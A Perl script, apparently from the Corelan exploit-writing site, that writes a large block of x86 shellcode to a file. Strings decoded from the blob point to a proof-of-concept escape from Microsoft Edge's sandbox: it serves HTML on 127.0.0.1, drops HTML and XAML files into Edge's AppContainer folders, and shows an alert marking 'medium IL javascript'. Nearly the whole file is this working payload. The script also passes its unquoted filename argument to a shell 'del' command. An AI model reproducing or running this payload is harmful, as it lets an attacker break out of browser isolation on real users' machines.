#!/usr/bin/perl
# Perl script written by Peter Van Eeckhoutte
# http://www.corelan.be
# This script takes a filename as argument
# will write bytes in \x format to the file 
#
if ($#ARGV ne 0) { 
print "  usage: $0 ".chr(34)."output filename".chr(34)."\n"; 
exit(0); 
} 
system("del $ARGV[0]");
my $shellcode="\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x7e\x0d\x01\x01\x81\xf1\x01\x01".
"\x01\x01\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x11\x0f\x44\xc6\xaa".
"\xe2\xf6\xe8\x11\x11\x11\x11\x5e\x8b\xfe\x81\xc6\x3b\x09\x11\x11".
"\xb9\x09\x11\x11\x11\xfc\xad\x01\x3c\x07\xe2\xfa\x55\x8b\xec\x81".
"\xec\xb4\x0a\x11\x11\x53\x56\x57\xb9\xac\xd5\xaa\x88\xe8\xc9\x07".
"\x11\x11\x89\x45\x8c\xb9\xa7\x0b\x59\x08\xe8\xbc\x07\x11\x11\x89".
"\x45\xa0\xb9\x50\x35\x1a\xba\xe8\xaf\x07\x11\x11\x89\x45\xac\xb9".
"\xf1\x55\xa6\x1c\xe8\xa2\x07\x11\x11\x89\x85\x7c\xff\xff\xff\xb9".
"\x5b\x47\xb0\xd0\xe8\x92\x07\x11\x11\x89\x85\x30\xff\xff\xff\xb9".
"\x06\x37\xb4\x54\xe8\x82\x07\x11\x11\x89\x45\x88\xb9\xbd\x26\xc9".
"\x0c\xe8\x75\x07\x11\x11\x89\x85\x6c\xff\xff\xff\xb9\x29\x8c\x7a".
"\x99\xe8\x65\x07\x11\x11\x89\x45\xe8\xb9\xfb\xc5\x91\x4c\xe8\x58".
"\x07\x11\x11\x89\x45\xf4\xb9\x78\xf5\x44\x52\xe8\x4b\x07\x11\x11".
"\x89\x85\x28\xff\xff\xff\xb9\x40\xd5\xdc\x2d\xe8\x3b\x07\x11\x11".
"\x89\x85\x2c\xff\xff\xff\xb9\xe4\xf2\x0e\x3b\xe8\x2b\x07\x11\x11".
"\x89\x85\x24\xff\xff\xff\xb9\xe2\xfa\x1b\x01\xe8\x1b\x07\x11\x11".
"\x89\x85\x1c\xff\xff\xff\xb9\x2a\x02\x52\xb9\xe8\x0b\x07\x11\x11".
"\x89\x85\x18\xff\xff\xff\xb9\x1a\x95\x0e\xdb\xe8\xfb\x06\x11\x11".
"\x89\x85\x14\xff\xff\xff\xb9\x5b\x31\x66\x3b\xe8\xeb\x06\x11\x11".
"\x89\x85\x10\xff\xff\xff\xb9\x3c\x01\xfa\xd8\xe8\xdb\x06\x11\x11".
"\x89\x85\x0c\xff\xff\xff\xb9\x55\x5d\x25\x4b\xe8\xcb\x06\x11\x11".
"\x89\x85\xf8\xfe\xff\xff\xb9\xc4\xa1\x0d\xec\xe8\xbb\x06\x11\x11".
"\x89\x45\x9c\x8b\x45\x9c\x83\xc0\x05\x89\x85\x74\xff\xff\xff\xb9".
"\xfa\x81\x2f\x86\xe8\xa2\x06\x11\x11\x89\x85\x78\xff\xff\xff\xe8".
"\x11\x11\x11\x11\x5b\x8d\x9b\x44\x06\x11\x11\x89\x5d\xc8\x8d\x85".
"\xf4\xfe\xff\xff\x50\x6a\x40\x6a\x1e\xff\x75\xc8\xff\x95\x78\xff".
"\xff\xff\x8b\x85\x74\xff\xff\xff\x2b\x45\xc8\x83\xe8\x05\x89\x85".
"\x70\xff\xff\xff\x8b\x45\xc8\xc6\x11\xe9\x8b\x45\xc8\x8b\x8d\x70".
"\xff\xff\xff\x89\x48\x01\x6a\x05\xff\x75\x9c\xe8\xf7\x06\x11\x11".
"\x59\x59\x6a\x11\x68\x19\x0c\x11\x11\xff\x95\x6c\xff\xff\xff\x89".
"\x45\xf8\x6a\x05\xff\x75\xf8\xff\x55\xe8\x89\x45\xfc\x6a\x02\xff".
"\x75\xfc\xff\x55\xe8\x89\x45\xfc\x8b\x45\xfc\x89\x45\xf8\x6a\x05".
"\xff\x75\xf8\xff\x55\xe8\x89\x45\xfc\x8b\x45\xfc\x89\x45\xf8\x6a".
"\x02\xff\x75\xf8\xff\x55\xe8\x89\x45\xfc\x8b\x45\xfc\x89\x45\xf8".
"\x6a\x05\xff\x75\xf8\xff\x55\xe8\x89\x45\xfc\x8b\x45\xfc\x89\x45".
"\xf8\x6a\x05\xff\x75\xf8\xff\x55\xe8\x89\x45\xfc\x8b\x45\xfc\x89".
"\x45\xf8\x6a\x05\xff\x75\xf8\xff\x55\xe8\x89\x45\xfc\x8b\x45\xfc".
"\x89\x45\xf8\x6a\x11\x6a\x09\x68\x11\x01\x11\x11\xff\x75\xfc\xff".
"\x55\xf4\x6a\x11\x6a\x09\x68\x01\x01\x11\x11\xff\x75\xfc\xff\x55".
"\xf4\x6a\x11\x6a\x0d\x68\x11\x01\x11\x11\xff\x75\xfc\xff\x55\xf4".
"\x6a\x11\x6a\x0d\x68\x01\x01\x11\x11\xff\x75\xfc\xff\x55\xf4\x8d".
"\x85\xe4\xfa\xff\xff\x89\x45\xb8\x8d\x85\xe0\xf9\xff\xff\x89\x45".
"\xe4\x8d\x85\xdc\xf8\xff\xff\x89\x45\xa8\xff\x75\xb8\x6a\x11\x6a".
"\x11\x6a\x28\x6a\x11\xff\x55\xac\xff\x75\xe4\x6a\x11\x6a\x11\x6a".
"\x28\x6a\x11\xff\x55\xac\xff\x75\xa8\x6a\x11\x6a\x11\x6a\x28\x6a".
"\x11\xff\x55\xac\x6a\x1a\x59\xbe\x5b\x0b\x11\x11\x8d\xbd\x84\xfe".
"\xff\xff\xf3\xa5\x6a\x15\x59\xbe\xc3\x0b\x11\x11\x8d\xbd\xe0\xfd".
"\xff\xff\xf3\xa5\x66\xa5\x6a\x15\x59\xbe\x59\x0a\x11\x11\x8d\xbd".
"\x88\xfd\xff\xff\xf3\xa5\x66\xa5\x68\x88\x13\x11\x11\xff\x55\xa0".
"\xe8\x11\x11\x11\x11\x59\x8d\x89\xc1\x04\x11\x11\x50\x8a\x01\x88".
"\x85\xd9\xfe\xff\xff\x8a\x41\x01\x88\x85\xda\xfe\xff\xff\x8a\x41".
"\x02\x88\x85\xdb\xfe\xff\xff\x8a\x41\x03\x88\x85\xdc\xfe\xff\xff".
"\x8a\x41\x04\x88\x85\xdd\xfe\xff\xff\x8a\x41\x05\x88\x85\xde\xfe".
"\xff\xff\x8a\x41\x06\x88\x85\xdf\xfe\xff\xff\x8a\x41\x07\x88\x85".
"\xe0\xfe\xff\xff\x8d\x85\x84\xfe\xff\xff\x89\x45\xe0\x8b\x45\xe0".
"\x89\x45\x98\x8b\x45\xe0\x8a\x11\x88\x45\xec\xff\x45\xe0\x80\x7d".
"\xec\x11\x75\xef\x8b\x45\xe0\x2b\x45\x98\x8b\x4d\x98\x89\x8d\x68".
"\xff\xff\xff\x89\x85\x64\xff\xff\xff\x8b\x45\xb8\x48\x89\x45\xc4".
"\x8b\x45\xc4\x8a\x40\x01\x88\x45\xf3\xff\x45\xc4\x80\x7d\xf3\x11".
"\x75\xee\x8b\x7d\xc4\x8b\xb5\x68\xff\xff\xff\x8b\x85\x64\xff\xff".
"\xff\x8b\xc8\xc1\xe9\x02\xf3\xa5\x8b\xc8\x83\xe1\x03\xf3\xa4\x8d".
"\x85\xe0\xfd\xff\xff\x89\x45\xdc\x8b\x45\xdc\x89\x45\x94\x8b\x45".
"\xdc\x8a\x11\x88\x45\xf2\xff\x45\xdc\x80\x7d\xf2\x11\x75\xef\x8b".
"\x45\xdc\x2b\x45\x94\x8b\x4d\x94\x89\x8d\x60\xff\xff\xff\x89\x85".
"\x5c\xff\xff\xff\x8b\x45\xe4\x48\x89\x45\xc0\x8b\x45\xc0\x8a\x40".
"\x01\x88\x45\xf1\xff\x45\xc0\x80\x7d\xf1\x11\x75\xee\x8b\x7d\xc0".
"\x8b\xb5\x60\xff\xff\xff\x8b\x85\x5c\xff\xff\xff\x8b\xc8\xc1\xe9".
"\x02\xf3\xa5\x8b\xc8\x83\xe1\x03\xf3\xa4\x8d\x85\x88\xfd\xff\xff".
"\x89\x45\xd8\x8b\x45\xd8\x89\x45\x90\x8b\x45\xd8\x8a\x11\x88\x45".
"\xf0\xff\x45\xd8\x80\x7d\xf0\x11\x75\xef\x8b\x45\xd8\x2b\x45\x90".
"\x8b\x4d\x90\x89\x8d\x58\xff\xff\xff\x89\x85\x54\xff\xff\xff\x8b".
"\x45\xa8\x48\x89\x45\xbc\x8b\x45\xbc\x8a\x40\x01\x88\x45\xef\xff".
"\x45\xbc\x80\x7d\xef\x11\x75\xee\x8b\x7d\xbc\x8b\xb5\x58\xff\xff".
"\xff\x8b\x85\x54\xff\xff\xff\x8b\xc8\xc1\xe9\x02\xf3\xa5\x8b\xc8".
"\x83\xe1\x03\xf3\xa4\x6a\x28\x59\xbe\xb9\x0a\x11\x11\x8d\xbd\xe4".
"\xfc\xff\xff\xf3\xa5\xa4\x8d\x85\xe4\xfc\xff\xff\x89\x45\xd4\x8b".
"\x45\xd4\x40\x89\x85\x50\xff\xff\xff\x8b\x45\xd4\x8a\x11\x88\x45".
"\xee\xff\x45\xd4\x80\x7d\xee\x11\x75\xef\x8b\x45\xd4\x2b\x85\x50".
"\xff\xff\xff\x89\x85\x4c\xff\xff\xff\x8b\x85\x4c\xff\xff\xff\x89".
"\x85\x3c\xff\xff\xff\x83\xa5\x40\xff\xff\xff\x11\x83\xa5\xf0\xfe".
"\xff\xff\x11\x6a\x12\x59\xbe\x30\x0c\x11\x11\x8d\xbd\x38\xfe\xff".
"\xff\xf3\xa5\x66\xa5\x8d\x85\x38\xfe\xff\xff\x89\x45\xd0\x8b\x45".
"\xd0\x40\x89\x85\x48\xff\xff\xff\x8b\x45\xd0\x8a\x11\x88\x45\xed".
"\xff\x45\xd0\x80\x7d\xed\x11\x75\xef\x8b\x45\xd0\x2b\x85\x48\xff".
"\xff\xff\x89\x85\x44\xff\xff\xff\x8b\x85\x44\xff\xff\xff\x89\x85".
"\x34\xff\xff\xff\x83\xa5\x38\xff\xff\xff\x11\x83\xa5\xec\xfe\xff".
"\xff\x11\x6a\x11\x68\x80\x11\x11\x11\x6a\x02\x6a\x11\x6a\x11\x68".
"\x11\x11\x11\x40\xff\x75\xb8\xff\x55\x8c\x89\x45\x84\x6a\x11\x8d".
"\x85\x40\xff\xff\xff\x50\xff\xb5\x3c\xff\xff\xff\x8d\x85\xe4\xfc".
"\xff\xff\x50\xff\x75\x84\xff\x55\x88\x6a\x11\x68\x80\x11\x11\x11".
"\x6a\x02\x6a\x11\x6a\x11\x68\x11\x11\x11\x40\xff\x75\xa8\xff\x55".
"\x8c\x89\x45\x80\x6a\x11\x8d\x85\x38\xff\xff\xff\x50\xff\xb5\x34".
"\xff\xff\xff\x8d\x85\x38\xfe\xff\xff\x50\xff\x75\x80\xff\x55\x88".
"\xff\x75\x84\xff\x95\x7c\xff\xff\xff\xff\x75\x80\xff\x95\x7c\xff".
"\xff\xff\xff\x75\xe4\xff\x75\xb8\xff\x95\x30\xff\xff\xff\x8d\x85".
"\x4c\xf7\xff\xff\x50\x68\x02\x02\x11\x11\xff\x95\x2c\xff\xff\xff".
"\x83\x65\xa4\x11\x6a\x3e\x59\xbe\x5f\x09\x11\x11\x8d\xbd\xe8\xfb".
"\xff\xff\xf3\xa5\x66\xa5\x66\xa1\x5a\x0b\x11\x11\x66\x89\x45\xb0".
"\x83\x65\xb4\x11\x8b\x45\xe4\x03\x45\xb4\x0f\xbe\x11\x33\xc9\x41".
"\xd1\xe1\x0f\xbe\x4c\x0d\xb0\x3b\xc1\x74\x09\x8b\x45\xb4\x40\x89".
"\x45\xb4\xeb\xe0\xff\x75\xb4\xff\x75\xe4\x33\xc0\x40\x6b\xc0\x56".
"\x8d\x84\x05\xe8\xfb\xff\xff\x50\xff\x95\x28\xff\xff\xff\x83\xc4".
"\x0c\xc7\x85\x20\xff\xff\xff\xaf\x0a\x11\x11\x83\x65\xcc\x11\x6a".
"\x11\x6a\x01\x6a\x02\xff\x95\x24\xff\xff\xff\x89\x45\xcc\x33\xc0".
"\x8d\xbd\xfc\xfe\xff\xff\xab\xab\xab\xab\x6a\x02\x58\x66\x89\x85".
"\xfc\xfe\xff\xff\xb8\x15\xb3\x11\x11\x66\x89\x85\xfe\xfe\xff\xff".
"\xff\xb5\x20\xff\xff\xff\xff\x95\x1c\xff\xff\xff\x89\x85\x11\xff".
"\xff\xff\x6a\x10\x8d\x85\xfc\xfe\xff\xff\x50\xff\x75\xcc\xff\x95".
"\x18\xff\xff\xff\x6a\x11\xff\x75\xcc\xff\x95\x14\xff\xff\xff\x6a".
"\x11\x6a\x11\xff\x75\xcc\xff\x95\x10\xff\xff\xff\x89\x45\xa4\x68".
"\x2c\x01\x11\x11\x8d\x95\xe8\xfb\xff\xff\x8b\x4d\xa4\xe8\x37\x02".
"\x11\x11\x59\x6a\x11\x68\x11\x02\x11\x11\x8d\x85\x4c\xf5\xff\xff".
"\x50\xff\x75\xa4\xff\x95\x0c\xff\xff\xff\x68\xe8\x03\x11\x11\xff".
"\x55\xa0\x6a\x11\x6a\x09\x68\x11\x01\x11\x11\xff\x75\xfc\xff\x55".
"\xf4\x6a\x11\x6a\x09\x68\x01\x01\x11\x11\xff\x75\xfc\xff\x55\xf4".
"\x6a\x11\x6a\x0d\x68\x11\x01\x11\x11\xff\x75\xfc\xff\x55\xf4\x6a".
"\x11\x6a\x0d\x68\x01\x01\x11\x11\xff\x75\xfc\xff\x55\xf4\x33\xc0".
"\x40\x74\x07\x6a\x64\xff\x55\xa0\xeb\xf4\x8d\x40\x01\x81\x38\x43".
"\x11\x61\x11\x75\xf5\x8d\x40\x0c\xe8\x11\x11\x11\x11\x59\x8d\x49".
"\x69\x80\x39\x90\x75\x4b\x53\x8a\x18\x88\x19\x8a\x58\x02\x88\x59".
"\x01\x8a\x58\x04\x88\x59\x02\x8a\x58\x06\x88\x59\x03\x8a\x58\x08".
"\x88\x59\x04\x8a\x58\x0a\x88\x59\x05\x8a\x58\x0c\x88\x59\x06\x8a".
"\x58\x0e\x88\x59\x07\x5b\x3b\xc0\x74\x17\x50\x51\x8d\x45\x0c\x8b".
"\x08\x80\xfd\x11\x74\x0b\xb9\x43\x11\x3a\x11\x8b\x11\x39\x08\x74".
"\x99\x59\x58\x8b\xff\x55\x8b\xec\xeb\x27\x90\x90\x90\x90\x90\x90".
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90".
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90".
"\x90\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca".
"\x0d\x3c\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01".
"\x84\xc0\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec".
"\x14\x53\x56\x57\x89\x4d\xf4\x64\xa1\x30\x11\x11\x11\x89\x45\xfc".
"\x8b\x45\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf".
"\xe8\xd2\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46".
"\x3c\x8b\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8".
"\x96\xff\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89".
"\x4d\xf0\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce".
"\xe8\x75\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc".
"\x8b\x4d\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec".
"\x75\x9c\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44".
"\x33\x24\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88".
"\x8b\x04\x30\x03\xc6\xeb\xdd\x55\x8b\xec\x83\xec\x14\x53\xe8\x11".
"\x11\x11\x11\x5b\x81\xeb\x29\x01\x11\x11\x89\x5d\xf8\xb9\xfa\x81".
"\x2f\x86\xe8\x34\xff\xff\xff\x89\x45\xfc\x8d\x45\xf0\x50\x6a\x40".
"\xff\x75\x0c\xff\x75\x08\xff\x55\xfc\x8b\x45\xf8\x2b\x45\x08\x83".
"\xe8\x05\x89\x45\xf4\x8b\x45\x08\xc6\x11\xe9\x8b\x45\x08\x8b\x4d".
"\xf4\x89\x48\x01\x8d\x45\xec\x50\xff\x75\xf0\xff\x75\x0c\xff\x75".
"\x08\xff\x55\xfc\x5b\x8b\xe5\x5d\xc3\x55\x8b\xec\x51\x53\x56\x8b".
"\xd9\xb9\x2a\x01\x52\xdb\x57\x8b\xfa\xe8\xdd\xfe\xff\xff\x8b\x75".
"\x08\x89\x45\xfc\xeb\x0e\x6a\x11\x56\x57\x53\xff\xd0\x03\xf8\x2b".
"\xf0\x8b\x45\xfc\x85\xf6\x7f\xee\x5f\x33\xc0\x5e\x40\x5b\x8b\xe5".
"\x5d\xc3\xae\x01\x11\x11\xb1\x02\x11\x11\xc1\x02\x11\x11\xd3\x02".
"\x11\x11\x82\x04\x11\x11\xe0\x04\x11\x11\xe1\x05\x11\x11\xf1\x05".
"\x11\x11\x40\x06\x11\x11\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x32".
"\x30\x30\x20\x4f\x4b\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54".
"\x79\x70\x65\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x0d\x0a".
"\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20".
"\x31\x37\x30\x0d\x0a\x0d\x0a\x3c\x68\x74\x6d\x6c\x3e\x3c\x62\x6f".
"\x64\x79\x3e\x3c\x61\x20\x68\x72\x65\x66\x3d\x22\x20\x20\x20\x20".
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20".
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20".
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20".
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20".
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20".
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20".
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20".
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x20".
"\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x3e\x62\x6c\x61\x68\x3c\x2f\x61".
"\x3e\x3c\x2f\x62\x6f\x64\x79\x3e\x3c\x2f\x68\x74\x6d\x6c\x3e\x11".
"\x5c\x41\x70\x70\x44\x61\x74\x61\x5c\x4c\x6f\x63\x61\x6c\x5c\x50".
"\x61\x63\x6b\x61\x67\x65\x73\x5c\x4d\x69\x63\x72\x6f\x73\x6f\x66".
"\x74\x2e\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74\x45\x64\x67\x65\x5f".
"\x38\x77\x65\x6b\x79\x62\x33\x64\x38\x62\x62\x77\x65\x5c\x41\x43".
"\x5c\x23\x21\x30\x30\x31\x5c\x74\x65\x6d\x70\x5c\x74\x65\x73\x74".
"\x2e\x68\x74\x6d\x6c\x11\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x11".
"\x3c\x21\x2d\x2d\x20\x73\x61\x76\x65\x64\x20\x66\x72\x6f\x6d\x20".
"\x75\x72\x6c\x3d\x28\x30\x30\x31\x36\x29\x68\x74\x74\x70\x3a\x2f".
"\x2f\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x20\x2d\x2d\x3e\x3c\x50".
"\x61\x67\x65\x20\x78\x6d\x6c\x6e\x73\x3d\x22\x68\x74\x74\x70\x3a".
"\x2f\x2f\x73\x63\x68\x65\x6d\x61\x73\x2e\x6d\x69\x63\x72\x6f\x73".
"\x6f\x66\x74\x2e\x63\x6f\x6d\x2f\x77\x69\x6e\x66\x78\x2f\x32\x30".
"\x30\x36\x2f\x78\x61\x6d\x6c\x2f\x70\x72\x65\x73\x65\x6e\x74\x61".
"\x74\x69\x6f\x6e\x22\x3e\x3c\x46\x72\x61\x6d\x65\x20\x53\x6f\x75".
"\x72\x63\x65\x3d\x22\x74\x65\x73\x74\x2e\x68\x74\x6d\x6c\x22\x3e".
"\x3c\x2f\x46\x72\x61\x6d\x65\x3e\x3c\x2f\x50\x61\x67\x65\x3e\x20".
"\x11\x11\x5c\x41\x70\x70\x44\x61\x74\x61\x5c\x4c\x6f\x63\x61\x6c".
"\x5c\x50\x61\x63\x6b\x61\x67\x65\x73\x5c\x4d\x69\x63\x72\x6f\x73".
"\x6f\x66\x74\x2e\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74\x45\x64\x67".
"\x65\x5f\x38\x77\x65\x6b\x79\x62\x33\x64\x38\x62\x62\x77\x65\x5c".
"\x41\x43\x5c\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74\x45\x64\x67\x65".
"\x5c\x43\x61\x63\x68\x65\x5c\x52\x45\x50\x4c\x41\x43\x45\x4d\x5c".
"\x74\x65\x73\x74\x2e\x78\x61\x6d\x6c\x11\x5c\x41\x70\x70\x44\x61".
"\x74\x61\x5c\x4c\x6f\x63\x61\x6c\x5c\x50\x61\x63\x6b\x61\x67\x65".
"\x73\x5c\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74\x2e\x4d\x69\x63\x72".
"\x6f\x73\x6f\x66\x74\x45\x64\x67\x65\x5f\x38\x77\x65\x6b\x79\x62".
"\x33\x64\x38\x62\x62\x77\x65\x5c\x41\x43\x5c\x23\x21\x30\x30\x31".
"\x5c\x74\x65\x6d\x70\x5c\x74\x65\x73\x74\x2e\x78\x61\x6d\x6c\x11".
"\x41\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x46\x72\x61\x6d\x65".
"\x57\x69\x6e\x64\x6f\x77\x11\x3c\x68\x74\x6d\x6c\x3e\x3c\x62\x6f".
"\x64\x79\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74".
"\x28\x22\x6d\x65\x64\x69\x75\x6d\x20\x49\x4c\x20\x6a\x61\x76\x61".
"\x73\x63\x72\x69\x70\x74\x22\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70".
"\x74\x3e\x3c\x2f\x62\x6f\x64\x79\x3e\x3c\x2f\x68\x74\x6d\x6c\x3e".
"\x11";




#open file in binary mode
print "Writing to ".$ARGV[0]."\n";
open(FILE,">$ARGV[0]");
binmode FILE;
print FILE $shellcode;
close(FILE);

print "Wrote ".length($shellcode)." bytes to file\n";


